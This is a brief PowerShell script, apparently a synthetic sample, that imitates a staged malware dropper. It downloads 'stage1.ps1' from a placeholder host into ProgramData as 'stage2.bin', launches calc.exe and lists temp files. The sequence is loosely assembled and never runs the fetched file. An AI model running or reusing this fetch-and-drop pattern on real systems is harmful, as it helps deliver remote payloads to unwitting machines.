
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://contoso.com/stage1.ps1',
    [string]$LocalPath = 'C:\ProgramData\stage2.bin',
    [int]$TimeoutSec = 192
)
try { Invoke-WebRequest -Uri $RemoteUrl -OutFile $LocalPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Stage transfer failed" }
